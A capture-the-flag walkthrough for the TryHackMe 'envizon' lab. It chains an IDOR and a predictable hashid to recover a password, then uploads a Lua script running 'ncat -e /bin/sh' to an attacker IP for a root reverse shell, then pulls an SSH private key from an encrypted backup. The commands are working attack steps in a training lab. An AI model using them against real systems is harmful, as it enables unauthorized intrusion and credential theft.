# [envizon](https://tryhackme.com/room/envizon)

## Attacking the pentesters

# Targeting a modern web application

You are facing an instance of the open source software "envizon" (https://github.com/evait-security/envizon) which is used by pentesters to visualize networks, find promising targets and a lot of other juicy stuff. It was developed by pentesters and should be almost unbreakable, right? The version 4.0.2alpha used here is still in permanent development and has not been tested for vulnerabilities yet. Your task is to find, exploit and chain vulnerabilities in a white-box approach in order to completely compromise the whole system.

You can find the source code for the current version here: https://gitlab.com/evait-security/envizon_thm

Three hints to start:

- This is not an empty instance. Imagine that it is/was used and therefore contains user data
- Currently a note function is under development
- When looking for code execution on the system, the most obvious way is the best - it is important to understand what the application does

Selenium container and with it the screenshot function has been disabled because of the high ram usage.

### What password is used by the current envizon instance?

_Vulnerability Types: Insecure direct object references (IDOR), Insecure/Predictable hash calculation_

1. Start with initial reconnaissance by scanning the target machine with nmap to discover open ports and services:

```bash
nmap <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

2. Navigate to `https://<TARGET_IP>:3000/users/sign_in` in your browser. You'll see the Envizon login page.

3. Perform directory enumeration to discover hidden endpoints and functionality:

```bash
gobuster dir -u https://<TARGET_IP>:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 50
```

**Results:**

```
/images               (Status: 302) [Size: 105] [--> https://<TARGET_IP>:3000/users/sign_in]
/admin                (Status: 302) [Size: 103] [--> https://<TARGET_IP>:3000/admin/login]
/reports              (Status: 302) [Size: 105] [--> https://<TARGET_IP>:3000/users/sign_in]
/issues               (Status: 302) [Size: 105] [--> https://<TARGET_IP>:3000/users/sign_in]
/groups               (Status: 302) [Size: 105] [--> https://<TARGET_IP>:3000/users/sign_in]
/clients              (Status: 302) [Size: 105] [--> https://<TARGET_IP>:3000/users/sign_in]
/notes                (Status: 302) [Size: 105] [--> https://<TARGET_IP>:3000/users/sign_in]
/404                  (Status: 200) [Size: 1722]
/500                  (Status: 200) [Size: 1635]
/422                  (Status: 200) [Size: 1705]
/scans                (Status: 302) [Size: 105] [--> https://<TARGET_IP>:3000/users/sign_in]
```

4. Try accessing notes directly without authentication using IDOR. Visit `https://<TARGET_IP>:3000/notes/1` and observe that you can view notes without being authenticated - this is an Insecure Direct Object Reference (IDOR) vulnerability.

**Content of notes:**

```
Text: Hi Paul, for security reasons I added hashids with a length of 30 characters to notes. I stored the password for this envizon instance in the note with id 380 and sent you the link by email. We may should consider to add more security layers to this gem (https://github.com/dtaniwaki/acts_as_hashids)
```

5. Generate the hashid for note 380 to access the password. Install the hashids gem and calculate the hash:

```bash
gem install hashids
irb
require "hashids"
hid = Hashids.new('Note', 30)
hid.encode(380)
```

<img width="1343" height="159" alt="SCREEN01" src="https://github.com/user-attachments/assets/9c625ebf-963f-4ec2-a799-2e34f5e15d44" />

6. Visit `https://<TARGET_IP>:3000/notes/y2a419eKDBLRvEYobWNpw0jnr6xlAX` to retrieve the envizon instance password.

<img width="850" height="224" alt="SCREEN02" src="https://github.com/user-attachments/assets/0534438e-726f-4545-9b87-7a512be292c2" />

---

### local.txt

_Vulnerability Types: Unrestricted file upload, Full path disclosure (optional), Command injection_

1. Login to the Envizon application at `https://<TARGET_IP>:3000/users/sign_in` using the credentials discovered earlier.

2. Navigate to the scans functionality. Envizon allows importing scan results, and based on the source code review, it processes various scan file formats including Nmap XML files. However, it also processes Lua scripts used by Nmap's NSE (Nmap Scripting Engine). This presents an opportunity for command injection through Lua script execution.

Create a malicious Lua script that establishes a reverse shell:

```bash
echo "os.execute(\"ncat -e /bin/sh <ATTACKER_IP> 4444\")" > upload.lua
```

3. Set up a netcat listener on your attacking machine to catch the incoming connection:

```bash
nc -lvnp 4444
```

4. Upload the malicious Lua script through the scan import functionality at `https://<TARGET_IP>:3000/scans`.

<img width="1751" height="371" alt="SCREEN03" src="https://github.com/user-attachments/assets/3a8dede7-53d9-4240-b90f-d5ad57a4a4c0" />

5. Check the `Tasks` > `Retries` section to get the full path where files are stored and understand the processing workflow:

<img width="1761" height="717" alt="SCREEN04" src="https://github.com/user-attachments/assets/76a1f93d-e04d-4e1a-9f8c-afc473bb8209" />

6. Run the `Manual Scan`:

<img width="1757" height="382" alt="SCREEN05" src="https://github.com/user-attachments/assets/9dbfa686-f600-4272-9ce5-a6cd59ad244e" />

7. Verify your access and retrieve the local flag:

```bash
whoami
# root
ls /root
cat /root/local.txt
```

<img width="272" height="117" alt="SCREEN06" src="https://github.com/user-attachments/assets/a0a4c96f-e2b7-426e-bc86-108c1b723d91" />

---

### root.txt

_We always backup our stuff_

1. Explore the root filesystem to identify any backup-related files or configurations:

```bash
ls -al /
```

**Results:**

```
total 88
drwxr-xr-x    1 root     root          4096 Sep 30  2020 .
drwxr-xr-x    1 root     root          4096 Sep 30  2020 ..
-rwxr-xr-x    1 root     root             0 Sep 30  2020 .dockerenv
drwxr-xr-x    1 root     root          4096 Sep 30  2020 bin
drwxr-xr-x    5 root     root           340 Feb 16 20:23 dev
-rwxr-xr-x    1 root     root           858 Sep 30  2020 entrypoint_development.sh
-rwxr-xr-x    1 root     root          1561 Sep 30  2020 entrypoint_local.sh
drwxr-xr-x    1 root     root          4096 Sep 30  2020 etc
drwxr-xr-x    2 root     root          4096 May 29  2020 home
drwxr-xr-x    1 root     root          4096 Sep 30  2020 lib
drwxr-xr-x    5 root     root          4096 May 29  2020 media
drwxr-xr-x    2 root     root          4096 May 29  2020 mnt
drwxr-xr-x    2 root     root          4096 May 29  2020 opt
dr-xr-xr-x  124 root     root             0 Feb 16 20:23 proc
drwx------    1 root     root          4096 Sep 30  2020 root
drwxr-xr-x    3 root     root          4096 Sep 30  2020 run
drwxr-xr-x    1 root     root          4096 Jun 26  2020 sbin
drwxr-xr-x    2 root     root          4096 May 29  2020 srv
dr-xr-xr-x   13 root     root             0 Feb 16 20:22 sys
drwxrwxrwt    1 root     root          4096 Sep 30  2020 tmp
drwxr-xr-x    1 root     root          4096 Sep 30  2020 usr
drwxr-xr-x    1 root     root          4096 Sep 30  2020 var
```

The presence of `.dockerenv` confirms we're inside a Docker container.

2. Check for scheduled tasks that might perform backups. On Alpine Linux, periodic tasks are stored in `/etc/periodic/`:

```bash
cat /etc/periodic/daily/*
```

**Results:**

```bash
#!/bin/sh

# todo: implement daily backup with borgmatic. current config is wip
# borgmatic
```

This reveals that the system uses **borgmatic** and there's a configuration file we should investigate.

3. Examine the borgmatic configuration to understand the backup setup:

```bash
cat /etc/borgmatic/config.yaml
```

**Results:**

```yaml
# Where to look for files to backup, and where to store those backups.
# See https://borgbackup.readthedocs.io/en/stable/quickstart.html and
# https://borgbackup.readthedocs.io/en/stable/usage/create.html
# for details.
location:
  # List of source directories to backup (required). Globs and
  # tildes are expanded.
  source_directories:
    - /root

  # Paths to local or remote repositories (required). Tildes are
  # expanded. Multiple repositories are backed up to in
  # sequence. See ssh_command for SSH options like identity file
  # or port.
  repositories:
    - /var/backup

retention:
  # Retention policy for how many backups to keep.
  keep_daily: 7
  keep_weekly: 4
  keep_monthly: 6

storage:
  encryption_passcommand: "echo 4bikDP8iaCEvgYksIKPUmACEwGYPcnlQ"
```

- Backups are stored in `/var/backup`
- The `/root` directory is being backed up
- The encryption password is **hardcoded** in the config: `4bikDP8iaCEvgYksIKPUmACEwGYPcnlQ`

4. List available backup archives:

```bash
borgmatic list
```

**Results:**

```
/var/backup: Listing archives
envizon-2020-09-30T23:25:30.466049   Wed, 2020-09-30 23:25:31 [b2aae5e7803b2134e2dc913b10b03430a4b892c3b32dd2f1556175f51e85c8bc]
envizon-2020-09-30T23:26:23.900026   Wed, 2020-09-30 23:26:25 [d027cf90321085f4cf1b1f1883c7287051f8350568ae1ecf421b52fb906f91a3]
```

5. Extract the first backup archive to access its contents:

```bash
borgmatic extract --archive envizon-2020-09-30T23:25:30.466049
```

6. Investigate the extracted backup for sensitive information, particularly SSH keys:

```bash
ls -la root/.ssh
```

**Results:**

```
total 12
drwxr-xr-x    2 root     root          4096 Sep 30  2020 .
drwx------    6 root     root          4096 Sep 30  2020 ..
-rw-------    1 root     root           399 Sep 30  2020 id_ed25519
```

7. Copy the SSH private key to your attacking machine, and use it to connect directly to the host machine as root:

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 root@<TARGET_IP>
```

8. Retrieve the final flag:

```bash
cat /root/root.txt
```

<img width="294" height="85" alt="SCREEN07" src="https://github.com/user-attachments/assets/47576089-3d79-41fd-a4f1-a01fefd41da0" />
